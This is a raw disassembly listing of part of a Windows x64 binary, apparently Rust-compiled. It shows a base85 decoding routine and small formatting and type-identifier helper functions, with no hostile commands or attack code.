   140001dfd:	cc                   	int3
   140001dfe:	cc                   	int3
   140001dff:	cc                   	int3
   140001e00:	8d 51 d0             	lea    -0x30(%rcx),%edx
   140001e03:	66 b8 02 00          	mov    $0x2,%ax
   140001e07:	80 fa 0a             	cmp    $0xa,%dl
   140001e0a:	73 04                	jae    0x140001e10
   140001e0c:	89 d1                	mov    %edx,%ecx
   140001e0e:	eb 1a                	jmp    0x140001e2a
   140001e10:	8d 41 bf             	lea    -0x41(%rcx),%eax
   140001e13:	3c 1a                	cmp    $0x1a,%al
   140001e15:	73 05                	jae    0x140001e1c
   140001e17:	80 c1 c9             	add    $0xc9,%cl
   140001e1a:	eb 0a                	jmp    0x140001e26
   140001e1c:	8d 41 9f             	lea    -0x61(%rcx),%eax
   140001e1f:	3c 1a                	cmp    $0x1a,%al
   140001e21:	73 13                	jae    0x140001e36
   140001e23:	80 c1 c3             	add    $0xc3,%cl
   140001e26:	66 b8 02 00          	mov    $0x2,%ax
   140001e2a:	0f b6 c9             	movzbl %cl,%ecx
   140001e2d:	c1 e1 08             	shl    $0x8,%ecx
   140001e30:	0f b7 c0             	movzwl %ax,%eax
   140001e33:	09 c8                	or     %ecx,%eax
   140001e35:	c3                   	ret
   140001e36:	0f b6 d1             	movzbl %cl,%edx
   140001e39:	66 b8 01 00          	mov    $0x1,%ax
   140001e3d:	83 c2 df             	add    $0xffffffdf,%edx
   140001e40:	83 fa 5d             	cmp    $0x5d,%edx
   140001e43:	77 e5                	ja     0x140001e2a
   140001e45:	4c 8d 05 34 06 07 00 	lea    0x70634(%rip),%r8        # 0x140072480
   140001e4c:	49 63 14 90          	movslq (%r8,%rdx,4),%rdx
   140001e50:	4c 01 c2             	add    %r8,%rdx
   140001e53:	ff e2                	jmp    *%rdx
   140001e55:	b1 3e                	mov    $0x3e,%cl
   140001e57:	eb cd                	jmp    0x140001e26
   140001e59:	b1 50                	mov    $0x50,%cl
   140001e5b:	eb c9                	jmp    0x140001e26
   140001e5d:	b1 53                	mov    $0x53,%cl
   140001e5f:	eb c5                	jmp    0x140001e26
   140001e61:	b1 4b                	mov    $0x4b,%cl
   140001e63:	eb c1                	jmp    0x140001e26
   140001e65:	b1 48                	mov    $0x48,%cl
   140001e67:	eb bd                	jmp    0x140001e26
   140001e69:	b1 40                	mov    $0x40,%cl
   140001e6b:	eb b9                	jmp    0x140001e26
   140001e6d:	b1 42                	mov    $0x42,%cl
   140001e6f:	eb b5                	jmp    0x140001e26
   140001e71:	b1 54                	mov    $0x54,%cl
   140001e73:	eb b1                	jmp    0x140001e26
   140001e75:	b1 4a                	mov    $0x4a,%cl
   140001e77:	eb ad                	jmp    0x140001e26
   140001e79:	b1 51                	mov    $0x51,%cl
   140001e7b:	eb a9                	jmp    0x140001e26
   140001e7d:	b1 43                	mov    $0x43,%cl
   140001e7f:	eb a5                	jmp    0x140001e26
   140001e81:	b1 49                	mov    $0x49,%cl
   140001e83:	eb a1                	jmp    0x140001e26
   140001e85:	b1 41                	mov    $0x41,%cl
   140001e87:	eb 9d                	jmp    0x140001e26
   140001e89:	b1 3f                	mov    $0x3f,%cl
   140001e8b:	eb 99                	jmp    0x140001e26
   140001e8d:	b1 44                	mov    $0x44,%cl
   140001e8f:	eb 95                	jmp    0x140001e26
   140001e91:	b1 45                	mov    $0x45,%cl
   140001e93:	eb 91                	jmp    0x140001e26
   140001e95:	b1 4c                	mov    $0x4c,%cl
   140001e97:	eb 8d                	jmp    0x140001e26
   140001e99:	b1 4d                	mov    $0x4d,%cl
   140001e9b:	eb 89                	jmp    0x140001e26
   140001e9d:	b1 47                	mov    $0x47,%cl
   140001e9f:	eb 85                	jmp    0x140001e26
   140001ea1:	b1 46                	mov    $0x46,%cl
   140001ea3:	eb 81                	jmp    0x140001e26
   140001ea5:	b1 4f                	mov    $0x4f,%cl
   140001ea7:	e9 7a ff ff ff       	jmp    0x140001e26
   140001eac:	b1 4e                	mov    $0x4e,%cl
   140001eae:	e9 73 ff ff ff       	jmp    0x140001e26
   140001eb3:	b1 52                	mov    $0x52,%cl
   140001eb5:	e9 6c ff ff ff       	jmp    0x140001e26
   140001eba:	cc                   	int3
   140001ebb:	cc                   	int3
   140001ebc:	cc                   	int3
   140001ebd:	cc                   	int3
   140001ebe:	cc                   	int3
   140001ebf:	cc                   	int3
   140001ec0:	55                   	push   %rbp
   140001ec1:	41 57                	push   %r15
   140001ec3:	41 56                	push   %r14
   140001ec5:	41 55                	push   %r13
   140001ec7:	41 54                	push   %r12
   140001ec9:	56                   	push   %rsi
   140001eca:	57                   	push   %rdi
   140001ecb:	53                   	push   %rbx
   140001ecc:	48 83 ec 78          	sub    $0x78,%rsp
   140001ed0:	48 8d 6c 24 70       	lea    0x70(%rsp),%rbp
   140001ed5:	48 c7 45 00 fe ff ff 	movq   $0xfffffffffffffffe,0x0(%rbp)
   140001edc:	ff 
   140001edd:	4c 89 c3             	mov    %r8,%rbx
   140001ee0:	49 89 d7             	mov    %rdx,%r15
   140001ee3:	48 89 cf             	mov    %rcx,%rdi
   140001ee6:	48 b9 cd cc cc cc cc 	movabs $0xcccccccccccccccd,%rcx
   140001eed:	cc cc cc 
   140001ef0:	4c 89 c0             	mov    %r8,%rax
   140001ef3:	48 f7 e1             	mul    %rcx
   140001ef6:	48 89 d6             	mov    %rdx,%rsi
   140001ef9:	48 89 d0             	mov    %rdx,%rax
   140001efc:	48 c1 e8 02          	shr    $0x2,%rax
   140001f00:	4c 8d 24 80          	lea    (%rax,%rax,4),%r12
   140001f04:	4c 29 e3             	sub    %r12,%rbx
   140001f07:	48 83 e6 fc          	and    $0xfffffffffffffffc,%rsi
   140001f0b:	45 31 f6             	xor    %r14d,%r14d
   140001f0e:	48 89 d8             	mov    %rbx,%rax
   140001f11:	48 83 e8 01          	sub    $0x1,%rax
   140001f15:	49 0f 42 c6          	cmovb  %r14,%rax
   140001f19:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140001f1d:	48 01 c6             	add    %rax,%rsi
   140001f20:	78 31                	js     0x140001f53
   140001f22:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
   140001f26:	48 89 5d c0          	mov    %rbx,-0x40(%rbp)
   140001f2a:	4c 89 7d d0          	mov    %r15,-0x30(%rbp)
   140001f2e:	74 2e                	je     0x140001f5e
   140001f30:	0f b6 05 ba a1 07 00 	movzbl 0x7a1ba(%rip),%eax        # 0x14007c0f1
   140001f37:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140001f3d:	ba 01 00 00 00       	mov    $0x1,%edx
   140001f42:	48 89 f1             	mov    %rsi,%rcx
   140001f45:	e8 76 fe ff ff       	call   0x140001dc0
   140001f4a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140001f4e:	48 85 c0             	test   %rax,%rax
   140001f51:	75 14                	jne    0x140001f67
   140001f53:	4c 89 f1             	mov    %r14,%rcx
   140001f56:	48 89 f2             	mov    %rsi,%rdx
   140001f59:	e8 e7 96 01 00       	call   0x14001b645
   140001f5e:	b8 01 00 00 00       	mov    $0x1,%eax
   140001f63:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140001f67:	48 b8 fc ff ff ff ff 	movabs $0x7ffffffffffffffc,%rax
   140001f6e:	ff ff 7f 
   140001f71:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
   140001f75:	48 21 f0             	and    %rsi,%rax
   140001f78:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001f7c:	4c 89 65 d8          	mov    %r12,-0x28(%rbp)
   140001f80:	49 83 fc 05          	cmp    $0x5,%r12
   140001f84:	73 2d                	jae    0x140001fb3
   140001f86:	48 8b 7d c0          	mov    -0x40(%rbp),%rdi
   140001f8a:	48 85 ff             	test   %rdi,%rdi
   140001f8d:	0f 84 44 02 00 00    	je     0x1400021d7
   140001f93:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140001f97:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   140001f9b:	0f b6 0c 10          	movzbl (%rax,%rdx,1),%ecx
   140001f9f:	48 83 ff 01          	cmp    $0x1,%rdi
   140001fa3:	0f 85 fb 00 00 00    	jne    0x1400020a4
   140001fa9:	45 31 ff             	xor    %r15d,%r15d
   140001fac:	31 db                	xor    %ebx,%ebx
   140001fae:	e9 27 01 00 00       	jmp    0x1400020da
   140001fb3:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
   140001fb7:	48 f7 de             	neg    %rsi
   140001fba:	4c 8b 4d d8          	mov    -0x28(%rbp),%r9
   140001fbe:	48 8b 5d d0          	mov    -0x30(%rbp),%rbx
   140001fc2:	4c 8b 7d f8          	mov    -0x8(%rbp),%r15
   140001fc6:	48 85 f6             	test   %rsi,%rsi
   140001fc9:	74 bb                	je     0x140001f86
   140001fcb:	4d 85 ff             	test   %r15,%r15
   140001fce:	74 b6                	je     0x140001f86
   140001fd0:	4c 89 4d b8          	mov    %r9,-0x48(%rbp)
   140001fd4:	0f b6 0b             	movzbl (%rbx),%ecx
   140001fd7:	e8 24 fe ff ff       	call   0x140001e00
   140001fdc:	44 0f b7 e0          	movzwl %ax,%r12d
   140001fe0:	41 c1 ec 08          	shr    $0x8,%r12d
   140001fe4:	3c 02                	cmp    $0x2,%al
   140001fe6:	0f 85 0f 01 00 00    	jne    0x1400020fb
   140001fec:	0f b6 4b 01          	movzbl 0x1(%rbx),%ecx
   140001ff0:	e8 0b fe ff ff       	call   0x140001e00
   140001ff5:	44 0f b7 f0          	movzwl %ax,%r14d
   140001ff9:	41 c1 ee 08          	shr    $0x8,%r14d
   140001ffd:	3c 02                	cmp    $0x2,%al
   140001fff:	0f 85 f9 01 00 00    	jne    0x1400021fe
   140002005:	0f b6 4b 02          	movzbl 0x2(%rbx),%ecx
   140002009:	e8 f2 fd ff ff       	call   0x140001e00
   14000200e:	44 0f b7 e8          	movzwl %ax,%r13d
   140002012:	41 c1 ed 08          	shr    $0x8,%r13d
   140002016:	3c 02                	cmp    $0x2,%al
   140002018:	0f 85 d9 01 00 00    	jne    0x1400021f7
   14000201e:	0f b6 4b 03          	movzbl 0x3(%rbx),%ecx
   140002022:	e8 d9 fd ff ff       	call   0x140001e00
   140002027:	0f b7 f8             	movzwl %ax,%edi
   14000202a:	c1 ef 08             	shr    $0x8,%edi
   14000202d:	3c 02                	cmp    $0x2,%al
   14000202f:	0f 85 bb 01 00 00    	jne    0x1400021f0
   140002035:	0f b6 4b 04          	movzbl 0x4(%rbx),%ecx
   140002039:	e8 c2 fd ff ff       	call   0x140001e00
   14000203e:	0f b7 c8             	movzwl %ax,%ecx
   140002041:	c1 e9 08             	shr    $0x8,%ecx
   140002044:	3c 02                	cmp    $0x2,%al
   140002046:	4c 8b 4d b8          	mov    -0x48(%rbp),%r9
   14000204a:	75 7a                	jne    0x1400020c6
   14000204c:	49 83 c1 fb          	add    $0xfffffffffffffffb,%r9
   140002050:	41 0f b7 c4          	movzwl %r12w,%eax
   140002054:	69 c0 b1 84 1c 03    	imul   $0x31c84b1,%eax,%eax
   14000205a:	41 0f b7 d6          	movzwl %r14w,%edx
   14000205e:	69 d2 ed 5e 09 00    	imul   $0x95eed,%edx,%edx
   140002064:	01 c2                	add    %eax,%edx
   140002066:	41 0f b7 c5          	movzwl %r13w,%eax
   14000206a:	69 c0 39 1c 00 00    	imul   $0x1c39,%eax,%eax
   140002070:	44 0f b7 c7          	movzwl %di,%r8d
   140002074:	45 6b c0 55          	imul   $0x55,%r8d,%r8d
   140002078:	41 01 c0             	add    %eax,%r8d
   14000207b:	41 01 d0             	add    %edx,%r8d
   14000207e:	0f b7 c1             	movzwl %cx,%eax
   140002081:	44 01 c0             	add    %r8d,%eax
   140002084:	0f c8                	bswap  %eax
   140002086:	41 89 07             	mov    %eax,(%r15)
   140002089:	48 83 c6 04          	add    $0x4,%rsi
   14000208d:	49 83 c7 04          	add    $0x4,%r15
   140002091:	48 83 c3 05          	add    $0x5,%rbx
   140002095:	49 83 f9 05          	cmp    $0x5,%r9
   140002099:	0f 83 27 ff ff ff    	jae    0x140001fc6
   14000209f:	e9 e2 fe ff ff       	jmp    0x140001f86
   1400020a4:	44 0f b6 6c 10 01    	movzbl 0x1(%rax,%rdx,1),%r13d
   1400020aa:	48 83 ff 03          	cmp    $0x3,%rdi
   1400020ae:	72 0f                	jb     0x1400020bf
   1400020b0:	44 0f b6 74 10 02    	movzbl 0x2(%rax,%rdx,1),%r14d
   1400020b6:	75 18                	jne    0x1400020d0
   1400020b8:	b3 01                	mov    $0x1,%bl
   1400020ba:	45 31 ff             	xor    %r15d,%r15d
   1400020bd:	eb 1b                	jmp    0x1400020da
   1400020bf:	45 31 ff             	xor    %r15d,%r15d
   1400020c2:	31 db                	xor    %ebx,%ebx
   1400020c4:	eb 14                	jmp    0x1400020da
   1400020c6:	24 01                	and    $0x1,%al
   1400020c8:	41 89 cc             	mov    %ecx,%r12d
   1400020cb:	e9 33 01 00 00       	jmp    0x140002203
   1400020d0:	0f b6 74 10 03       	movzbl 0x3(%rax,%rdx,1),%esi
   1400020d5:	41 b7 01             	mov    $0x1,%r15b
   1400020d8:	b3 01                	mov    $0x1,%bl
   1400020da:	e8 21 fd ff ff       	call   0x140001e00
   1400020df:	44 0f b7 e0          	movzwl %ax,%r12d
   1400020e3:	41 c1 ec 08          	shr    $0x8,%r12d
   1400020e7:	3c 02                	cmp    $0x2,%al
   1400020e9:	75 10                	jne    0x1400020fb
   1400020eb:	48 83 ff 01          	cmp    $0x1,%rdi
   1400020ef:	75 11                	jne    0x140002102
   1400020f1:	31 c0                	xor    %eax,%eax
   1400020f3:	45 31 e4             	xor    %r12d,%r12d
   1400020f6:	e9 08 01 00 00       	jmp    0x140002203
   1400020fb:	24 01                	and    $0x1,%al
   1400020fd:	e9 01 01 00 00       	jmp    0x140002203
   140002102:	44 89 e9             	mov    %r13d,%ecx
   140002105:	e8 f6 fc ff ff       	call   0x140001e00
   14000210a:	0f b7 c0             	movzwl %ax,%eax
   14000210d:	89 c7                	mov    %eax,%edi
   14000210f:	c1 ef 08             	shr    $0x8,%edi
   140002112:	3c 02                	cmp    $0x2,%al
   140002114:	0f 85 d6 00 00 00    	jne    0x1400021f0
   14000211a:	44 89 f1             	mov    %r14d,%ecx
   14000211d:	66 41 be 7e 00       	mov    $0x7e,%r14w
   140002122:	66 41 bd 7e 00       	mov    $0x7e,%r13w
   140002127:	84 db                	test   %bl,%bl
   140002129:	74 15                	je     0x140002140
   14000212b:	e8 d0 fc ff ff       	call   0x140001e00
   140002130:	44 0f b7 e8          	movzwl %ax,%r13d
   140002134:	41 c1 ed 08          	shr    $0x8,%r13d
   140002138:	3c 02                	cmp    $0x2,%al
   14000213a:	0f 85 b7 00 00 00    	jne    0x1400021f7
   140002140:	45 84 ff             	test   %r15b,%r15b
   140002143:	74 17                	je     0x14000215c
   140002145:	89 f1                	mov    %esi,%ecx
   140002147:	e8 b4 fc ff ff       	call   0x140001e00
   14000214c:	44 0f b7 f0          	movzwl %ax,%r14d
   140002150:	41 c1 ee 08          	shr    $0x8,%r14d
   140002154:	3c 02                	cmp    $0x2,%al
   140002156:	0f 85 a2 00 00 00    	jne    0x1400021fe
   14000215c:	41 0f b7 c4          	movzwl %r12w,%eax
   140002160:	69 c0 b1 84 1c 03    	imul   $0x31c84b1,%eax,%eax
   140002166:	0f b7 cf             	movzwl %di,%ecx
   140002169:	69 c9 ed 5e 09 00    	imul   $0x95eed,%ecx,%ecx
   14000216f:	01 c1                	add    %eax,%ecx
   140002171:	41 0f b7 c5          	movzwl %r13w,%eax
   140002175:	69 c0 39 1c 00 00    	imul   $0x1c39,%eax,%eax
   14000217b:	01 c8                	add    %ecx,%eax
   14000217d:	41 0f b7 ce          	movzwl %r14w,%ecx
   140002181:	6b c9 55             	imul   $0x55,%ecx,%ecx
   140002184:	01 c8                	add    %ecx,%eax
   140002186:	83 c0 7e             	add    $0x7e,%eax
   140002189:	89 c1                	mov    %eax,%ecx
   14000218b:	c1 e9 18             	shr    $0x18,%ecx
   14000218e:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140002192:	4c 8b 45 f0          	mov    -0x10(%rbp),%r8
   140002196:	42 88 0c 02          	mov    %cl,(%rdx,%r8,1)
   14000219a:	84 db                	test   %bl,%bl
   14000219c:	74 39                	je     0x1400021d7
   14000219e:	48 83 7d e0 01       	cmpq   $0x1,-0x20(%rbp)
   1400021a3:	0f 84 9e 00 00 00    	je     0x140002247
   1400021a9:	89 c1                	mov    %eax,%ecx
   1400021ab:	c1 e9 10             	shr    $0x10,%ecx
   1400021ae:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   1400021b2:	4c 8b 45 f0          	mov    -0x10(%rbp),%r8
   1400021b6:	42 88 4c 02 01       	mov    %cl,0x1(%rdx,%r8,1)
   1400021bb:	45 84 ff             	test   %r15b,%r15b
   1400021be:	74 17                	je     0x1400021d7
   1400021c0:	48 83 7d e0 03       	cmpq   $0x3,-0x20(%rbp)
   1400021c5:	0f 85 94 00 00 00    	jne    0x14000225f
   1400021cb:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   1400021cf:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   1400021d3:	88 64 11 02          	mov    %ah,0x2(%rcx,%rdx,1)
   1400021d7:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400021db:	48 8b 75 c8          	mov    -0x38(%rbp),%rsi
   1400021df:	48 89 06             	mov    %rax,(%rsi)
   1400021e2:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   1400021e6:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
   1400021ea:	48 89 46 10          	mov    %rax,0x10(%rsi)
   1400021ee:	eb 43                	jmp    0x140002233
   1400021f0:	24 01                	and    $0x1,%al
   1400021f2:	41 89 fc             	mov    %edi,%r12d
   1400021f5:	eb 0c                	jmp    0x140002203
   1400021f7:	24 01                	and    $0x1,%al
   1400021f9:	45 89 ec             	mov    %r13d,%r12d
   1400021fc:	eb 05                	jmp    0x140002203
   1400021fe:	24 01                	and    $0x1,%al
   140002200:	45 89 f4             	mov    %r14d,%r12d
   140002203:	48 8b 75 c8          	mov    -0x38(%rbp),%rsi
   140002207:	88 46 08             	mov    %al,0x8(%rsi)
   14000220a:	44 88 66 09          	mov    %r12b,0x9(%rsi)
   14000220e:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   140002215:	00 00 80 
   140002218:	48 89 06             	mov    %rax,(%rsi)
   14000221b:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   14000221f:	48 85 d2             	test   %rdx,%rdx
   140002222:	74 0f                	je     0x140002233
   140002224:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000222a:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   14000222e:	e8 9d fb ff ff       	call   0x140001dd0
   140002233:	48 89 f0             	mov    %rsi,%rax
   140002236:	48 83 c4 78          	add    $0x78,%rsp
   14000223a:	5b                   	pop    %rbx
   14000223b:	5f                   	pop    %rdi
   14000223c:	5e                   	pop    %rsi
   14000223d:	41 5c                	pop    %r12
   14000223f:	41 5d                	pop    %r13
   140002241:	41 5e                	pop    %r14
   140002243:	41 5f                	pop    %r15
   140002245:	5d                   	pop    %rbp
   140002246:	c3                   	ret
   140002247:	4c 8d 05 02 02 07 00 	lea    0x70202(%rip),%r8        # 0x140072450
   14000224e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002253:	ba 01 00 00 00       	mov    $0x1,%edx
   140002258:	e8 37 96 01 00       	call   0x14001b894
   14000225d:	eb 16                	jmp    0x140002275
   14000225f:	4c 8d 05 02 02 07 00 	lea    0x70202(%rip),%r8        # 0x140072468
   140002266:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000226b:	ba 02 00 00 00       	mov    $0x2,%edx
   140002270:	e8 1f 96 01 00       	call   0x14001b894
   140002275:	0f 0b                	ud2
   140002277:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000227e:	00 00 
   140002280:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002285:	55                   	push   %rbp
   140002286:	41 57                	push   %r15
   140002288:	41 56                	push   %r14
   14000228a:	41 55                	push   %r13
   14000228c:	41 54                	push   %r12
   14000228e:	56                   	push   %rsi
   14000228f:	57                   	push   %rdi
   140002290:	53                   	push   %rbx
   140002291:	48 83 ec 28          	sub    $0x28,%rsp
   140002295:	48 8d 6a 70          	lea    0x70(%rdx),%rbp
   140002299:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
   14000229e:	74 13                	je     0x1400022b3
   1400022a0:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400022a6:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   1400022aa:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   1400022ae:	e8 1d fb ff ff       	call   0x140001dd0
   1400022b3:	90                   	nop
   1400022b4:	48 83 c4 28          	add    $0x28,%rsp
   1400022b8:	5b                   	pop    %rbx
   1400022b9:	5f                   	pop    %rdi
   1400022ba:	5e                   	pop    %rsi
   1400022bb:	41 5c                	pop    %r12
   1400022bd:	41 5d                	pop    %r13
   1400022bf:	41 5e                	pop    %r14
   1400022c1:	41 5f                	pop    %r15
   1400022c3:	5d                   	pop    %rbp
   1400022c4:	c3                   	ret
   1400022c5:	cc                   	int3
   1400022c6:	cc                   	int3
   1400022c7:	cc                   	int3
   1400022c8:	cc                   	int3
   1400022c9:	cc                   	int3
   1400022ca:	cc                   	int3
   1400022cb:	cc                   	int3
   1400022cc:	cc                   	int3
   1400022cd:	cc                   	int3
   1400022ce:	cc                   	int3
   1400022cf:	cc                   	int3
   1400022d0:	55                   	push   %rbp
   1400022d1:	48 89 e5             	mov    %rsp,%rbp
   1400022d4:	48 b8 07 f7 71 23 73 	movabs $0x1c077e732371f707,%rax
   1400022db:	7e 07 1c 
   1400022de:	48 ba e8 7d 0a 23 59 	movabs $0x2dc29459230a7de8,%rdx
   1400022e5:	94 c2 2d 
   1400022e8:	5d                   	pop    %rbp
   1400022e9:	c3                   	ret
   1400022ea:	cc                   	int3
   1400022eb:	cc                   	int3
   1400022ec:	cc                   	int3
   1400022ed:	cc                   	int3
   1400022ee:	cc                   	int3
   1400022ef:	cc                   	int3
   1400022f0:	55                   	push   %rbp
   1400022f1:	48 89 e5             	mov    %rsp,%rbp
   1400022f4:	48 b8 78 41 a6 57 71 	movabs $0xb98b1b7157a64178,%rax
   1400022fb:	1b 8b b9 
   1400022fe:	48 ba 6d 5d cb d6 2c 	movabs $0x63eb502cd6cb5d6d,%rdx
   140002305:	50 eb 63 
   140002308:	5d                   	pop    %rbp
   140002309:	c3                   	ret
   14000230a:	cc                   	int3
   14000230b:	cc                   	int3
   14000230c:	cc                   	int3
   14000230d:	cc                   	int3
   14000230e:	cc                   	int3
   14000230f:	cc                   	int3
   140002310:	55                   	push   %rbp
   140002311:	48 89 e5             	mov    %rsp,%rbp
   140002314:	49 89 d0             	mov    %rdx,%r8
   140002317:	48 8b 01             	mov    (%rcx),%rax
   14000231a:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   14000231e:	48 89 c1             	mov    %rax,%rcx
   140002321:	5d                   	pop    %rbp
   140002322:	e9 99 4d 01 00       	jmp    0x1400170c0
   140002327:	cc                   	int3
   140002328:	cc                   	int3
   140002329:	cc                   	int3
   14000232a:	cc                   	int3
   14000232b:	cc                   	int3
   14000232c:	cc                   	int3
   14000232d:	cc                   	int3
   14000232e:	cc                   	int3
   14000232f:	cc                   	int3
   140002330:	55                   	push   %rbp
   140002331:	48 89 e5             	mov    %rsp,%rbp
   140002334:	48 8b 09             	mov    (%rcx),%rcx
   140002337:	8b 42 34             	mov    0x34(%rdx),%eax
   14000233a:	a8 10                	test   $0x10,%al
   14000233c:	75 0a                	jne    0x140002348
   14000233e:	a8 20                	test   $0x20,%al
   140002340:	75 0d                	jne    0x14000234f
   140002342:	5d                   	pop    %rbp
   140002343:	e9 68 73 01 00       	jmp    0x1400196b0
   140002348:	90                   	nop
   140002349:	5d                   	pop    %rbp
   14000234a:	e9 11 6d 01 00       	jmp    0x140019060
   14000234f:	90                   	nop
   140002350:	5d                   	pop    %rbp
   140002351:	e9 ba 6d 01 00       	jmp    0x140019110
   140002356:	cc                   	int3
   140002357:	cc                   	int3
   140002358:	cc                   	int3
   140002359:	cc                   	int3
   14000235a:	cc                   	int3
   14000235b:	cc                   	int3
   14000235c:	cc                   	int3
   14000235d:	cc                   	int3
   14000235e:	cc                   	int3
   14000235f:	cc                   	int3
   140002360:	55                   	push   %rbp
   140002361:	48 89 e5             	mov    %rsp,%rbp
   140002364:	48 89 d1             	mov    %rdx,%rcx
   140002367:	48 8d 15 b2 02 07 00 	lea    0x702b2(%rip),%rdx        # 0x140072620
   14000236e:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140002374:	5d                   	pop    %rbp
   140002375:	e9 76 45 01 00       	jmp    0x1400168f0
   14000237a:	cc                   	int3
   14000237b:	cc                   	int3
   14000237c:	cc                   	int3
   14000237d:	cc                   	int3
   14000237e:	cc                   	int3
   14000237f:	cc                   	int3
   140002380:	55                   	push   %rbp
   140002381:	48 89 e5             	mov    %rsp,%rbp
   140002384:	48 8b 09             	mov    (%rcx),%rcx
   140002387:	8b 42 34             	mov    0x34(%rdx),%eax
   14000238a:	a8 10                	test   $0x10,%al
   14000238c:	75 0a                	jne    0x140002398
   14000238e:	a8 20                	test   $0x20,%al
   140002390:	75 0d                	jne    0x14000239f
   140002392:	5d                   	pop    %rbp
   140002393:	e9 38 77 01 00       	jmp    0x140019ad0
   140002398:	90                   	nop
   140002399:	5d                   	pop    %rbp
   14000239a:	e9 81 6f 01 00       	jmp    0x140019320
   14000239f:	90                   	nop
   1400023a0:	5d                   	pop    %rbp
   1400023a1:	e9 2a 70 01 00       	jmp    0x1400193d0
   1400023a6:	cc                   	int3
   1400023a7:	cc                   	int3
   1400023a8:	cc                   	int3
   1400023a9:	cc                   	int3
   1400023aa:	cc                   	int3
   1400023ab:	cc                   	int3
   1400023ac:	cc                   	int3
   1400023ad:	cc                   	int3
   1400023ae:	cc                   	int3
   1400023af:	cc                   	int3
   1400023b0:	55                   	push   %rbp
   1400023b1:	48 83 ec 30          	sub    $0x30,%rsp
   1400023b5:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400023ba:	48 89 d0             	mov    %rdx,%rax
   1400023bd:	48 8b 09             	mov    (%rcx),%rcx
   1400023c0:	80 39 00             	cmpb   $0x0,(%rcx)
   1400023c3:	74 33                	je     0x1400023f8
   1400023c5:	48 ff c1             	inc    %rcx
   1400023c8:	48 89 4d f8          	mov    %rcx,-0x8(%rbp)
   1400023cc:	48 8d 0d 55 02 07 00 	lea    0x70255(%rip),%rcx        # 0x140072628
   1400023d3:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400023d8:	48 8d 15 02 06 07 00 	lea    0x70602(%rip),%rdx        # 0x1400729e1
   1400023df:	4c 8d 4d f8          	lea    -0x8(%rbp),%r9
   1400023e3:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400023e9:	48 89 c1             	mov    %rax,%rcx
   1400023ec:	e8 9f 4b 01 00       	call   0x140016f90
   1400023f1:	90                   	nop
   1400023f2:	48 83 c4 30          	add    $0x30,%rsp
   1400023f6:	5d                   	pop    %rbp
   1400023f7:	c3                   	ret
   1400023f8:	48 8d 15 de 05 07 00 	lea    0x705de(%rip),%rdx        # 0x1400729dd
   1400023ff:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140002405:	48 89 c1             	mov    %rax,%rcx
   140002408:	48 83 c4 30          	add    $0x30,%rsp
   14000240c:	5d                   	pop    %rbp
   14000240d:	e9 2e 49 01 00       	jmp    0x140016d40
   140002412:	cc                   	int3
   140002413:	cc                   	int3
   140002414:	cc                   	int3
   140002415:	cc                   	int3
   140002416:	cc                   	int3
   140002417:	cc                   	int3
   140002418:	cc                   	int3
   140002419:	cc                   	int3
   14000241a:	cc                   	int3
   14000241b:	cc                   	int3
   14000241c:	cc                   	int3
   14000241d:	cc                   	int3
   14000241e:	cc                   	int3
   14000241f:	cc                   	int3
   140002420:	55                   	push   %rbp
   140002421:	48 89 e5             	mov    %rsp,%rbp
   140002424:	48 8b 01             	mov    (%rcx),%rax
   140002427:	48 8b 08             	mov    (%rax),%rcx
   14000242a:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000242e:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002432:	5d                   	pop    %rbp
   140002433:	48 ff e0             	rex.W jmp *%rax
   140002436:	cc                   	int3
   140002437:	cc                   	int3
   140002438:	cc                   	int3
   140002439:	cc                   	int3
   14000243a:	cc                   	int3
   14000243b:	cc                   	int3
   14000243c:	cc                   	int3
   14000243d:	cc                   	int3
   14000243e:	cc                   	int3
   14000243f:	cc                   	int3
   140002440:	55                   	push   %rbp
   140002441:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140002448:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   14000244f:	00 
   140002450:	48 8b 01             	mov    (%rcx),%rax
   140002453:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
   140002457:	48 8b 52 28          	mov    0x28(%rdx),%rdx
   14000245b:	4c 8d 40 10          	lea    0x10(%rax),%r8
   14000245f:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140002463:	48 83 c0 14          	add    $0x14,%rax
   140002467:	4c 8d 0d 62 00 00 00 	lea    0x62(%rip),%r9        # 0x1400024d0
   14000246e:	4c 89 4d d8          	mov    %r9,-0x28(%rbp)
   140002472:	4c 89 45 e0          	mov    %r8,-0x20(%rbp)
